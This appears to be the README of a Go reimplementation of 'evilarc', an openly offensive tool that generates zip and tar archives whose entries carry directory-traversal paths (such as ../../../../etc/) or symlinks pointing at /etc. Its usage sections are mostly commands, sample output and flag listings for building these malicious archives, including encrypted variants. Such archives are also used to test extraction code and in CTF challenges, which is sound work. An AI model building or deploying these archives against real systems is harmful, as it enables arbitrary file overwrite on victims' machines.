# evilarc

> Legal Disclaimer: This tool is only intended for legally authorized enterprise security construction activities,
> such as internal attack and defense drills, vulnerability verification, and retesting.
>
> If you need to test the usability of this tool, please build your own target environment.
> When using this tool for testing, you should ensure that the behavior complies with local laws and
> regulations and has obtained sufficient authorization. Do not use against unauthorized targets.
>
> If you engage in any illegal behavior during the use of this tool,
> you shall bear the corresponding consequences on your own, and we will not assume any legal or joint liability

evilarc implementing with go, lets you create a zip file that contains files with directory traversal characters or symlink in their embedded path.

Compare with [evilarc](https://github.com/ptoomey3/evilarc), it supports 
- [x] run without dependency
- [x] zip encryption
- [x] symlinks attack.
- [ ] add evil file in compress file with exist file or folder
- [ ] archive(zip) bomb?

## 0x01 Background

Most commercial zip program (winzip, etc.) will prevent extraction of zip files whose embedded files contain paths with directory traversal characters.

However, some software development libraries do not include these same protection mechanisms. (ex. Golang, Java, PHP, Python etc.)

If a program and/or library does not prevent directory traversal characters then evilarc can be used to generate zip files that, once extracted, will place a file at an arbitrary location on the target system.

In *unix system, there may also be symlinks attacks

**My intention of writing this tool was to facilitate security testing during SDLC work and CTF.**
+ Attack in CTF: [CISCN2021 babypython](https://buuoj.cn/challenges)、 [2021深育杯 zipzip](https://xz.aliyun.com/t/10533#toc-4)、etc....
+ Attack in RealWorld:
  You can find much CVE or Framework fix this vulnerability, welcome to add here.

## 0x02 Usage

### 0x01 Path Traversal
1. generate attack zip file without any param
```shell
> evilarc travel

2023/12/09 17:27:35 The filename in the archive is: ../../../../../../../../etc/test_arc.txt
2023/12/09 17:27:35 [+] generate: evil.zip
```

2. generate attack zip file without zip password
```shell
> evilarc travel --travel-file 1.test

2023/12/09 17:01:05 The filename in the archive is: ../../../../../../../../etc/1.test
2023/12/09 17:01:05 [+] generate: evil.zip
```

3. generate attack zip file without zip password for specify unzip path
```shell
> evilarc travel --travel-file 1.test --travel-target tmp

2023/12/09 17:01:49 The filename in the archive is: ../../../../../../../../tmp/1.test
2023/12/09 17:01:49 [+] generate: evil.zip
```

4. generate attack zip file with empty zip password
```shell
> evilarc travel --zip-enc standard

2023/12/09 17:27:57 The filename in the archive is: ../../../../../../../../etc/test_arc.txt
2023/12/09 17:27:57 [+] generate: evil.zip
```

5. generate attack zip file with zip password
```shell
> evilarc travel --zip-enc standard --zip-passwd <password>
```

6. generate attack `tar/tar.gz/tgz/bz2` file (doesn't support encrypt because of these standard)
```shell
> evilarc travel --out xx.[tar.gz,tar,tgz,bz2]
```

7. other help
```shell
> evilarc travel -h

generate directory traversal attack archive

Usage:
  evilarc travel [flags]

Flags:
      --delimiter string        Custom path delimiter, Ex: \/\/ instead of //
  -h, --help                    help for travel
  -o, --out string              Output file, you can also specify xx.[tar.gz,tar,tgz,bz2]  (default "evil.zip")
  -p, --plat string             Platform: [win, unix] (default "unix")
  -d, --travel-depth int        Number of directories to traverse (default 8)
  -f, --travel-file string      Local file you want to traversal, (leave empty will auto generate a file in archive)
  -i, --travel-include string   Local file you want to include
                                 Ex: . or file/folder
  -t, --travel-target string    Path to include in filename after traversal.
                                 Ex: WINDOWS\\System32\\<file> or /etc/<file> (default "/etc")
  -e, --zip-enc string          Zip Encrypt method: [standard, AES128, AES192, AES256]
      --zip-passwd string       Zip password
```

### 0x02 Symlink
1. generate attack zip file without any param
```shell
> evilarc symlinks

2023/12/09 17:31:29 Relationship of symlink: evil/test_arc.txt -> /etc/test_arc.txt
2023/12/09 17:31:29 [+] generate: sym-evil.zip
```

2. other help
```shell
> evilarc symlinks -h

generate symlinks attack archive

Usage:
  evilarc symlinks [flags]

Flags:
  -h, --help                help for symlinks
  -o, --out string          Output file, you can also specify xx.[tar.gz,tar,tgz,bz2] (default "sym-evil.zip")
  -f, --sym-file string     local file you want to include, (leave empty will auto generate a file in archive)
  -n, --sym-name string     Symlink folder name (default "evil")
  -t, --sym-target string   Path to symlink.
                             Ex: <sym-name> -> /etc (default "/etc")
  -e, --zip-enc string      Encrypt method: [standard, AES128, AES192, AES256]
      --zip-passwd string   Zip password
```

## 0x99 Reference
[1] https://github.com/ptoomey3/evilarc.git